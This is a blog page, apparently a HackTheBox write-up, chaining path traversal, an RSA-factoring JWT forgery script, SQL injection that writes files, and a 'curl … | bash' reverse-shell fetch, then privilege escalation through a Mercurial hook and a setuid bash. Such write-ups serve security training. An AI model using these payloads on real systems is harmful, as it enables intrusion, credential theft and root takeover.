@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Yummy 11ab95255291808cac2bdff728027ba4 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Yummy 11ab95255291808cac2bdff728027ba4" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Yummy" />
+<meta property="og:description" content="Yummy" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/14/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/14/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-14T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Yummy 11ab95255291808cac2bdff728027ba4" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-14T16:05:57+00:00","datePublished":"2025-07-14T16:05:57+00:00","description":"Yummy","headline":"Yummy 11ab95255291808cac2bdff728027ba4","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/14/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1.html"},"url":"https://your-site-url/writeups/2025/07/14/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Yummy 11ab95255291808cac2bdff728027ba4</h1>
+  
+  <div class="post-date">
+    Published on 14 Jul 2025
+    
+  </div>
+  
+  <h1 id="yummy">Yummy</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start using nmap, there are just two ports open, ssh is there which means we will try to get some password</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image.png" alt="image.png" /></p>
+
+<p>In the port 80 there is a web application which theme is something about food</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_1.png" alt="image.png" /></p>
+
+<p>If we search a little bit more of what is powering this page, we can see that they are using a bootstrap template in the front end</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_2.png" alt="image.png" /></p>
+
+<p>We can register as a new user</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_3.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>And we are going to be able to book a table, here we could try to exploit different attacks such as SSTI or XSS but it didn’t work</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_4.png" alt="image.png" /></p>
+
+<p>Once we save the reservation we will be able to download it, using burpsuite we are going to see what is going on, where is that file taken from</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_5.png" alt="image.png" /></p>
+
+<p>It is used a JWT token and we are being redirected to the path where the .ics is downloaded.</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_6.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_7.png" alt="image.png" /></p>
+
+<p>Just there is where we gonna test LFI using path traversal</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_8.png" alt="image.png" /></p>
+
+<p>Effectively it is vulnerable, taking /etc/passwd we already have enumerate users in the machine</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_9.png" alt="image.png" /></p>
+
+<p>In this file we found that caddy server is running, it is also disclosed in the response header. But from now we need to find a way or path where we can find the backend application or something like that. I created a script where i took the token and exploit the vulnerability fuzzing /proc/<pid>/cmdline but that didn’t work, there are no much processes running on it</pid></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_10.png" alt="image.png" /></p>
+
+<p>Next step is try to get jobs or tasks that are being executed taking /etc/crontab</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_11.png" alt="image.png" /></p>
+
+<p>There are different paths related with the automation of tasks in the web application</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_12.png" alt="image.png" /></p>
+
+<p>Starting at the beginning we try with app_backup.sh</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_13.png" alt="image.png" /></p>
+
+<p>Basically it is zipping the folder where it is supposed the app hosted, that a big clue, let’s try to get the famous app.py present in the majority of web application that runs python behind</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_14.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_15.png" alt="image.png" /></p>
+
+<p>Good luck! We finally get the backend information, there we have a db password, but it didn’t work in ssh</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_16.png" alt="image.png" /></p>
+
+<p>A validation process is being made, it is checking for the administrator role, that’s a good point because having a JWT token we probably need to take it, decode it and change the role</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_17.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_18.png" alt="image.png" /></p>
+
+<p>A role is there, it’s time to find a way to decode the token and change the role</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_19.png" alt="image.png" /></p>
+
+<p>app.py give us the way</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_20.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_21.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_22.png" alt="image.png" /></p>
+
+<div class="language-coffeescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3</span>
+
+<span class="k">import</span> <span class="nx">argparse</span>
+<span class="k">import</span> <span class="nx">json</span>
+<span class="k">import</span> <span class="nx">base64</span>
+<span class="k">import</span> <span class="nx">sympy</span>
+<span class="k">import</span> <span class="nx">jwt</span>
+<span class="nx">from</span> <span class="nx">Crypto</span><span class="p">.</span><span class="na">PublicKey</span> <span class="k">import</span> <span class="nx">RSA</span>
+<span class="nx">from</span> <span class="nx">cryptography</span><span class="p">.</span><span class="na">hazmat</span><span class="p">.</span><span class="na">backends</span> <span class="k">import</span> <span class="nx">default_backend</span>
+<span class="nx">from</span> <span class="nx">cryptography</span><span class="p">.</span><span class="na">hazmat</span><span class="p">.</span><span class="na">primitives</span> <span class="k">import</span> <span class="nx">serialization</span>
+
+<span class="nx">def</span> <span class="nx">gettokenfile</span><span class="p">(</span><span class="nx">tokenfile</span><span class="p">)</span><span class="o">:</span>
+    <span class="c1">#Opening file and saving it as plaintext</span>
+    <span class="nx">with</span> <span class="nx">open</span><span class="p">(</span><span class="nx">tokenfile</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="nx">as</span> <span class="na">file</span><span class="o">:</span>
+        <span class="nx">content</span> <span class="o">=</span> <span class="nx">file</span><span class="p">.</span><span class="na">read</span><span class="p">()</span>
+
+    <span class="k">return</span><span class="p">(</span><span class="nx">content</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="o">:</span>
+    <span class="c1">##Taking arguments</span>
+    <span class="nx">parser</span> <span class="o">=</span> <span class="nx">argparse</span><span class="p">.</span><span class="na">ArgumentParser</span><span class="p">(</span><span class="nx">description</span> <span class="o">=</span> <span class="s">'Modificar argumentos en el payloda the un JWT'</span><span class="p">)</span>
+    <span class="nx">parser</span><span class="p">.</span><span class="na">add_argument</span><span class="p">(</span><span class="s">'token'</span><span class="p">,</span> <span class="nx">type</span><span class="o">=</span><span class="nx">str</span><span class="p">,</span> <span class="nx">help</span><span class="o">=</span><span class="s">'Pasa el JWT a modificar'</span><span class="p">)</span>
+    
+    <span class="nx">args</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="na">parse_args</span><span class="p">()</span>
+    <span class="c1">##Getting token as plain text</span>
+    <span class="nx">tokenfile</span> <span class="o">=</span> <span class="nx">args</span><span class="p">.</span><span class="na">token</span>
+    <span class="nx">token</span> <span class="o">=</span> <span class="nx">gettokenfile</span><span class="p">(</span><span class="nx">tokenfile</span><span class="p">)</span>
+    
+    <span class="c1">##Decoding and loading into a json text</span>
+    <span class="nx">jwtpayload</span> <span class="o">=</span> <span class="nx">json</span><span class="p">.</span><span class="na">loads</span><span class="p">(</span><span class="nx">base64</span><span class="p">.</span><span class="na">b64decode</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">'==='</span><span class="p">).</span><span class="na">decode</span><span class="p">())</span>
+
+    <span class="c1">##Breaking down the key in the jwt</span>
+    <span class="nx">n</span> <span class="o">=</span> <span class="nx">int</span><span class="p">(</span><span class="nx">jwtpayload</span><span class="p">[</span><span class="s">"jwk"</span><span class="p">][</span><span class="s">"n"</span><span class="p">])</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s">'imprimiendo valor de n {n}'</span><span class="p">)</span>
+
+    <span class="c1">##Getting 2 prime numbers</span>
+    <span class="nx">p</span><span class="p">,</span><span class="nx">q</span> <span class="o">=</span> <span class="nx">list</span><span class="p">((</span><span class="nx">sympy</span><span class="p">.</span><span class="na">factorint</span><span class="p">(</span><span class="nx">n</span><span class="p">)).</span><span class="na">keys</span><span class="p">())</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s">'p: {p} and q: {q}'</span><span class="p">)</span>
+
+    <span class="nx">e</span> <span class="o">=</span> <span class="nx">int</span><span class="p">(</span><span class="nx">jwtpayload</span><span class="p">[</span><span class="s">"jwk"</span><span class="p">][</span><span class="s">"e"</span><span class="p">])</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s">'Esto es e: {e}'</span><span class="p">)</span>
+    
+    <span class="c1">##Getting phi and the private exponent</span>
+    <span class="nx">phi</span> <span class="o">=</span> <span class="p">(</span><span class="nx">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nx">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+    <span class="nx">d</span> <span class="o">=</span> <span class="nx">pow</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="nx">phi</span><span class="p">)</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s">'esto es phi {phi}, esto es d : {d}'</span><span class="p">)</span>
+
+    <span class="nx">key</span> <span class="o">=</span> <span class="nx">RSA</span><span class="p">.</span><span class="na">construct</span><span class="p">((</span><span class="nx">n</span><span class="p">,</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">,</span><span class="nx">p</span><span class="p">,</span><span class="nx">q</span><span class="p">))</span>
+    <span class="nx">private_key_bytes</span> <span class="o">=</span> <span class="nx">key</span><span class="p">.</span><span class="na">export_key</span><span class="p">()</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s">'esta es key: {private_key_bytes}'</span><span class="p">)</span>
+
+    <span class="nx">private_key</span> <span class="o">=</span> <span class="nx">serialization</span><span class="p">.</span><span class="na">load_pem_private_key</span><span class="p">(</span>
+        <span class="nx">private_key_bytes</span><span class="p">,</span>
+        <span class="nx">password</span><span class="o">=</span><span class="nx">None</span><span class="p">,</span>
+        <span class="nx">backend</span><span class="o">=</span><span class="nx">default_backend</span><span class="p">()</span>
+    <span class="p">)</span>
+
+    <span class="nx">public_key</span> <span class="o">=</span> <span class="nx">private_key</span><span class="p">.</span><span class="na">public_key</span><span class="p">()</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span>
+    
+    <span class="c1">##Decode the token with the generated public key</span>
+    <span class="nx">data</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="nx">token</span><span class="o">+</span><span class="s">'='</span><span class="p">,</span> <span class="nx">public_key</span><span class="p">,</span> <span class="nx">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s">"RS256"</span><span class="p">])</span>
+    <span class="nx">data</span><span class="p">[</span><span class="s">"role"</span><span class="p">]</span><span class="o">=</span><span class="s">"administrator"</span>
+		
+		<span class="c1">#Enconde a new token with the same parameters except for the role</span>
+    <span class="nx">new_token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="na">encode</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">private_key</span><span class="p">,</span> <span class="nx">algorithm</span><span class="o">=</span><span class="s">"RS256"</span><span class="p">)</span>
+    <span class="nx">print</span><span class="p">(</span><span class="nx">f</span><span class="s">'Nuevo token: {new_token}'</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Once inside as administrator, we have access to all the reservations made by users, and we are able to search them by email.</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_23.png" alt="image.png" /></p>
+
+<p>Remember that we have access to some files thanks to LFI and path traversal</p>
+
+<p>In app.py we can realize there are no sanitization for the input in the sql query</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_24.png" alt="image.png" /></p>
+
+<p>and we know that in crontab there are some automation tasks which perform actions in the database, let’s dig into it</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_25.png" alt="image.png" /></p>
+
+<p>Begin inspecting <code class="language-plaintext highlighter-rouge">/data/scripts/dbmonitor.sh</code></p>
+
+<p>Making a general scanning we know that this is an automation to check database state, looking for the service ran by sql</p>
+
+<p>First, it checks if the database is not active, but we are not going to focus on there because the normal state of the database is active</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_26.png" alt="image.png" /></p>
+
+<p>That’s why we are focusing in the else statement, which represents when the database is active</p>
+
+<p>There is logic of the code checks if the file <code class="language-plaintext highlighter-rouge">/data/scripts/dbstatus.json</code> exists, this file normally is created when the database has been down, but as we said the database normal state is up. So we are going to use the next injection to create that <code class="language-plaintext highlighter-rouge">file%3b++select+"anything"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b</code></p>
+
+<p>that’s how we are going to create  <code class="language-plaintext highlighter-rouge">/data/scripts/dbstatus.json</code> to get into the if statement</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_27.png" alt="image.png" /></p>
+
+<p>Here the script checks if the string <code class="language-plaintext highlighter-rouge">database is down</code> is present in <code class="language-plaintext highlighter-rouge">/data/scripts/dbstatus.json</code> but we have write anything in the file, that’s makes us go to the else, there the script interpret that something went wrong with the database and it will find the latest version of <code class="language-plaintext highlighter-rouge">/data/scripts/fixer_v</code>  once that file is saved in a variable it will be executed with <code class="language-plaintext highlighter-rouge">/bin/bash</code></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_28.png" alt="image.png" /></p>
+
+<p>Now we know how we can get RCE we just need to create another file named <code class="language-plaintext highlighter-rouge">/data/scripts/fixer-v___</code> writing a reverse shell, or a command calling a reverse shell, making this injection it will be taken as the latest version and it will be executed</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%3b++select+<span class="s2">"ping+10.10.14.62%3b"</span>+INTO+OUTFILE++<span class="s1">'/data/scripts/dbstatus.json'</span>+%3b
+%3b++select+<span class="s2">"curl%2010.10.14.62:8000/rev.sh%20%7Cbash"</span>+INTO+OUTFILE++<span class="s1">'/data/scripts/fixer-v___'</span>+%3b
+</code></pre></div></div>
+
+<p>Now we have access as sql user, it’s time to make a lateral movement as www-data</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_29.png" alt="image.png" /></p>
+
+<p>we have full access over scripts directory</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_30.png" alt="image.png" /></p>
+
+<p>And as we remember app_backup.sh is executed by www-data user</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_31.png" alt="image.png" /></p>
+
+<p>create a simple reverse shell</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_32.png" alt="image.png" /></p>
+
+<p>Move it to app_backup.sh overwriting it</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_33.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_34.png" alt="image.png" /></p>
+
+<p>Now as data, we are able to see some files into home</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_35.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_36.png" alt="image.png" /></p>
+
+<p>Try to find a password in plain text</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_37.png" alt="image.png" /></p>
+
+<p>And get the credentials to get user flag</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_38.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>As qa we can see that mercurial (hg) is implemented on the system and we have read permissions to its configuration file</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_39.png" alt="image.png" /></p>
+
+<p>We also can execute configuration as dev user</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_40.png" alt="image.png" /></p>
+
+<p>Let’s copy it to tmp to perform some changes</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_41.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_42.png" alt="image.png" /></p>
+
+<p>There is a way using hooks to execute commands through it</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_43.png" alt="image.png" /></p>
+
+<p>We have three options but post is more convenient and as we saw before we can execute pull command</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_44.png" alt="image.png" /></p>
+
+<p>Let’s change the file configuration making execute a rev shell when pull action is performed</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_45.png" alt="image.png" /></p>
+
+<p>Let’s pull the project, due a bad configuration the binary will search any path as <code class="language-plaintext highlighter-rouge">/.hg/.hgrc</code> it executes out malicious file configuration</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_46.png" alt="image.png" /></p>
+
+<p>And we have made a lateral movement owning dev user, check for privileged commands  with <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_47.png" alt="image.png" /></p>
+
+<p>We can run as sudo a synchronization between the production part of the web application and the web application indeed, so we create a bash with a set uid and the run that command using</p>
+
+<p><code class="language-plaintext highlighter-rouge">—chown root:root</code> making root as the owner to bypass setuid filter</p>
+
+<p>then just making bash -p we can be able to we root, we need to run everything consecutively to make it effective</p>
+
+<p><img src="/assets/images/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1/0c9bde50-f585-4956-80e3-103c8cf13c6d-export-d8a78406-48de-46e8-a428-8a0384bea1e1_image_48.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!</p>
+
